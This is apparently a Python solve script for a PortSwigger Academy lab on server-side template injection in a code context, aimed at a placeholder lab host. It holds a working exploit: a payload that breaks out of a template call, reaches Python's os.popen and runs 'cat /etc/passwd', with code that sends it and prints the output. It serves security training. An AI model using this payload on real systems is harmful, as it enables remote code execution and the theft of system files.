"""
Lab 2: Basic server-side template injection (code context)
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-code-context
Difficulty: Practitioner

📝 The injection point is already INSIDE a template expression — e.g. a
product search box server-rendered as {{search(request.input)}}. Our
payload needs to close out of that existing function call before it can
inject its own expression, rather than opening {{ }} from scratch.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
SEARCH_PATH = "/search"  # confirm exact param name from the real search box


def inject(session, payload):
    r = session.get(f"{TARGET}{SEARCH_PATH}", params={"search": payload})
    return r.text


def run():
    s = get_session()

    note("Closing the existing search(...) call, then opening our own")
    note("expression — the )}} prefix here closes out before we inject.")

    probe = "x')}}{{7*7}}{{('x"
    text = inject(s, probe)
    if "49" in text:
        log("Confirmed: injected expression evaluated — code-context escape worked.")
    else:
        log("Probe didn't evaluate — the closing syntax may differ for this", ok=False)
        note("specific wrapping function; try variations like }} alone, or")
        note("')}} without the trailing re-open, depending on the exact context.")
        return

    cmd = "cat /etc/passwd"
    payload = (
        "x')}}{{ self.__init__.__globals__.__builtins__.__import__('os')"
        f".popen('{cmd}').read() }}{{('x"
    )
    note(f"RCE payload: {payload}")
    text = inject(s, payload)
    print(text[-800:])


if __name__ == "__main__":
    run()
